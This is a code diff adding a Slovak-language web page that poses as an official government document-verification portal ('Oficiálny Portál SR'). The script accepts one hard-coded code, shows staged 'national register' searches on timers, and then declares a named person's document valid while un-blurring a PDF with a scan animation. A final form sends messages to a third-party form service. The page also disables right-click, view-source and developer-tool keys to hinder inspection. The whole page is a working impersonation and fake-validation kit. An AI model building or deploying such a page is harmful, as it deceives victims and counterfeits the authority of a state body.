@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DOKLADSERVIS | Oficiálny Portál SR</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Times+New+Roman&family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+    <style>
+        :root { --primary: #051c33; --accent: #0052cc; --success: #27ae60; --error: #c0392b; }
+        
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
+        
+        body { font-family: 'Times New Roman', Times, serif; background: #fff; color: var(--primary); overflow-x: hidden; }
+
+        /* Sections */
+        section { display: none; width: 100%; max-width: 600px; margin: 0 auto; padding: 40px 25px; min-height: 100vh; }
+        .active { display: block; animation: fadeIn 0.8s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Page 1: Accueil */
+        .header-logo { text-align: center; margin-bottom: 30px; font-weight: bold; font-size: 1.4rem; color: var(--primary); border-bottom: 2px solid var(--primary); padding-bottom: 10px; }
+        .guide-text { text-align: justify; line-height: 1.6; font-size: 1.1rem; margin-bottom: 20px; }
+        .step-list { margin: 20px 0; padding-left: 20px; font-style: italic; }
+        .alert-box { border-left: 4px solid var(--error); padding: 15px; background: #fdf2f2; margin: 20px 0; font-weight: bold; }
+
+        /* Boutons */
+        .btn-main { background: var(--primary); color: white; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 1rem; text-transform: uppercase; transition: 0.3s; }
+        .btn-blue { background: var(--accent); margin-top: 20px; }
+
+        /* Page 2: Saisie Cases */
+        .terminal-header { text-align: left; margin-bottom: 40px; }
+        .code-container { display: flex; justify-content: space-between; margin-top: 40px; margin-bottom: 30px; }
+        .code-input { width: 40px; height: 55px; border: 1px solid #ccc; text-align: center; font-size: 1.5rem; font-weight: bold; border-radius: 4px; text-transform: uppercase; background: #f9f9f9; }
+        .code-input:focus { border-color: var(--accent); outline: none; background: #fff; box-shadow: 0 0 5px rgba(0,82,204,0.3); }
+
+        /* Page 3: Recherche */
+        .search-area { text-align: center; padding-top: 100px; }
+        .point-scanner { width: 15px; height: 15px; background: var(--success); border-radius: 50%; margin: 20px auto; animation: sideSwipe 1.5s infinite ease-in-out; }
+        @keyframes sideSwipe { 0% { transform: translateX(-50px); } 50% { transform: translateX(50px); } 100% { transform: translateX(-50px); } }
+
+        /* Page 4: Résultat & PDF */
+        .success-banner { background: var(--success); color: white; padding: 10px; text-align: center; font-weight: bold; margin-bottom: 20px; border-radius: 4px; }
+        .info-row { display: flex; margin-bottom: 10px; font-size: 1rem; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .label { font-weight: bold; color: #666; width: 160px; }
+        .value { color: var(--primary); font-weight: bold; }
+        
+        .pdf-frame { position: relative; width: 100%; height: 450px; background: #eee; margin-top: 30px; overflow: hidden; border: 1px solid #ccc; }
+        #pdf-obj { width: 100%; height: 100%; filter: blur(15px); transition: filter 0.5s; }
+        #scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00f2ff; box-shadow: 0 0 10px #00f2ff; z-index: 10; display: none; }
+
+        /* Page 5: Formspree */
+        textarea { width: 100%; height: 120px; padding: 15px; font-family: serif; margin-top: 15px; border: 1px solid #ccc; }
+
+        /* L'Oeil Flottant */
+        #eye-toggle { position: fixed; bottom: 20px; right: 20px; background: var(--primary); color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .hidden-mode { filter: blur(25px) grayscale(1); pointer-events: none; }
+    </style>
+</head>
+<body oncontextmenu="return false;" onkeydown="return disableKeys(event);">
+
+    <div id="eye-toggle" onclick="togglePrivacy()">
+        <i class="fas fa-eye" id="eye-icon"></i>
+    </div>
+
+    <div id="global-wrapper">
+        
+        <section id="step1" class="active">
+            <div class="header-logo">DOKLADSERVIS SLOVENSKÁ REPUBLIKA</div>
+            <p class="guide-text">Vitajte na oficiálnom portáli digitálneho overovania. Na zabezpečenie pravosti vašich dokumentov a ochranu vašich osobných údajov podlieha tento prístup prísnemu bezpečnostnému protokolu.</p>
+            <div class="step-list">
+                <p>• Kliknite na tlačidlo nižšie pre prístup k terminálu.</p>
+                <p>• Do vyhradených polí zadajte svoj unikátny 7-miestny kód.</p>
+                <p>• Systém vykoná analýzu v národnom registri.</p>
+            </div>
+            <div class="alert-box">Pozor! Nesprávne zadanie kódu po 3 pokusoch povedie k zablokovaniu prístupu na 24 hodín.</div>
+            <p class="guide-text" style="font-size: 0.9rem; color: #666;">Ak si želáte skryť informácie na stránke, stlačte ikonu 👁️ v dolnej časti obrazovky.</p>
+            <button class="btn-main" onclick="goToStep(2)">Pokračovať k overeniu</button>
+        </section>
+
+        <section id="step2">
+            <div class="terminal-header">
+                <h2>AUTORIZOVANÁ ZÓNA</h2>
+                <p style="margin-top:10px;">Uistite sa, že každé pole je správne vyplnené. Systém neumožňuje opravu po spustení analýzy.</p>
+            </div>
+            
+            <div class="code-container" id="inputs-group">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 0)">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 1)">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 2)">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 3)">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 4)">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 5)">
+                <input type="text" maxlength="1" class="code-input" oninput="moveNext(this, 6)">
+            </div>
+
+            <button class="btn-main btn-blue" onclick="validateCode()">Overiť kód</button>
+            <p id="error-msg" style="color:var(--error); margin-top:20px; text-align:center; font-weight:bold;"></p>
+        </section>
+
+        <section id="step3">
+            <div class="search-area">
+                <div class="point-scanner"></div>
+                <h3 id="search-status">Pripájanie k centrálnemu systému...</h3>
+                <p style="margin-top:15px; color:#666;">Prebieha identifikácia prístupového kľúča v národnej databáze...</p>
+            </div>
+        </section>
+
+        <section id="step4">
+            <div class="success-banner">OVERENIE ÚSPEŠNÉ</div>
+            <div class="info-row"><span class="label">IDENTIFIKÁTOR :</span><span class="value">SKB8412</span></div>
+            <div class="info-row"><span class="label">MENO A PRIEZVISKO :</span><span class="value">Zuzana Nováková</span></div>
+            <div class="info-row"><span class="label">DÁTUM VYDANIA :</span><span class="value">19.01.2026</span></div>
+            <div class="info-row"><span class="label">STAV DOKUMENTU :</span><span class="value" style="color:var(--success)">AKTÍVNY / PLATNÝ</span></div>
+
+            <div class="pdf-frame" id="pdf-box">
+                <div id="scan-line"></div>
+                <object id="pdf-obj" data="file/cert.pdf" type="application/pdf"></object>
+            </div>
+
+            <button class="btn-main btn-blue" id="btn-next-final" style="display:none;" onclick="goToStep(5)">Potvrdiť</button>
+        </section>
+
+        <section id="step5">
+            <h3>ZÁVEREČNÁ VALIDÁCIA</h3>
+            <p style="margin-top:10px;">Prosím, uveďte akúkoľvek chybu alebo potvrďte pripravenosť na ďalší krok.</p>
+            
+            <form action="https://formspree.io/f/xzddgpdn" method="POST" id="f-form">
+                <textarea name="message" id="f-msg" placeholder="Vaša správa..." required></textarea>
+                <p id="f-err" style="color:var(--error); display:none; margin-bottom:10px;">Toto pole je povinné.</p>
+                <button type="button" class="btn-main" onclick="submitForm()">Odoslať validáciu</button>
+            </form>
+        </section>
+
+        <section id="step6">
+            <div class="search-area">
+                <i class="fas fa-check-circle" style="font-size:4rem; color:var(--success);"></i>
+                <h2 style="margin-top:20px;">ĎAKUJEME</h2>
+                <p>Vaša správa bola bezpečne odoslaná. Budeme vás čoskoro kontaktovať.</p>
+            </div>
+        </section>
+
+    </div>
+
+    <audio id="beep-sound" src="https://www.soundjay.com/buttons/beep-07.mp3"></audio>
+
+    <script>
+        const VALID_KEY = "SKB8412";
+        let attempts = 0;
+
+        function goToStep(num) {
+            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + num).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        function moveNext(el, index) {
+            if (el.value.length === 1 && index < 6) {
+                document.querySelectorAll('.code-input')[index + 1].focus();
+            }
+        }
+
+        function validateCode() {
+            let userCode = "";
+            document.querySelectorAll('.code-input').forEach(i => userCode += i.value.toUpperCase());
+
+            goToStep(3);
+            setTimeout(() => { document.getElementById('search-status').innerText = "Identifikácia zložky..."; }, 2500);
+
+            setTimeout(() => {
+                if(userCode === VALID_KEY) {
+                    document.getElementById('beep-sound').play();
+                    goToStep(4);
+                    startLaserScan();
+                } else {
+                    attempts++;
+                    goToStep(2);
+                    document.getElementById('error-msg').innerText = "Systém nenašiel žiadnu zložku priradenú k tomuto kódu. Zostávajú " + (3-attempts) + " pokusy.";
+                    if(attempts >= 3) { alert("Prístup zablokovaný na 24h."); location.reload(); }
+                }
+            }, 5000);
+        }
+
+        function startLaserScan() {
+            const line = document.getElementById('scan-line');
+            const pdf = document.getElementById('pdf-obj');
+            line.style.display = 'block';
+            let pos = 0;
+            let intv = setInterval(() => {
+                pos += 3;
+                line.style.top = pos + "px";
+                if(pos > 100) pdf.style.filter = "blur(10px)";
+                if(pos > 250) pdf.style.filter = "blur(5px)";
+                if(pos > 400) pdf.style.filter = "blur(0px)";
+                if(pos >= 450) {
+                    clearInterval(intv);
+                    line.style.display = 'none';
+                    document.getElementById('btn-next-final').style.display = 'block';
+                }
+            }, 40);
+        }
+
+        function togglePrivacy() {
+            const wrapper = document.getElementById('global-wrapper');
+            const icon = document.getElementById('eye-icon');
+            wrapper.classList.toggle('hidden-mode');
+            icon.classList.toggle('fa-eye-slash');
+        }
+
+        function submitForm() {
+            const msg = document.getElementById('f-msg').value.trim();
+            if(!msg) { document.getElementById('f-err').style.display = 'block'; }
+            else { document.getElementById('f-form').submit(); setTimeout(()=> goToStep(6), 500); }
+        }
+
+        function disableKeys(e) {
+            if(e.ctrlKey && (e.key==='u' || e.key==='s' || e.key==='i')) return false;
+            if(e.key === 'F12') return false;
+        }
+    </script>
+</body>
+</html>
